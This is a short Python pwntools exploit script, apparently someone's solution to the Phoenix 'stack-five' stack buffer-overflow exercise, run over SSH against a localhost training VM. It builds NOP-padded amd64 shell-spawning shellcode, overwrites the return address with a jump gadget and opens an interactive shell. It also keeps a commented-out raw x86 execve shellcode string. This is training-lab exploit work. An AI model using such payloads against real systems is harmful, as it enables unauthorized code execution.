from pwn import *
context.arch = "amd64"
# If local.
# exe = ELF("/home/alexander/bin/cybersecurity/writeups/HTB/academy/buffer_overflow/stack-five")
# r = process([exe.path])
# r.interactive()
padding = b"\x90"
# address = "\xb0\xec\xff\xff"
address = p64(0x4004c3)
# 28 bytes intelx86, not for amd64
# shellcode = b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"
offset = cyclic_find(b"jaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabva")

shellcode = shellcraft.amd64.linux.sh()
shellcode = asm(shellcode)

# Right justify i.e shift shellcode with padding until it is 128 in length (to the right).
# shellcode = shellcode.ljust(offset, padding)
# left justify as we know that we are jumping to the code, due jmp rax.
shellcode = shellcode.ljust(offset, padding)

payload = (shellcode + address)
# payload = cyclic(200)

s = ssh(host="localhost", user="user", password="user", port=2222)
r = s.process("/opt/phoenix/amd64/stack-five")
r.recvuntil(b"https://exploit.education")
r.sendline(payload)
r.interactive()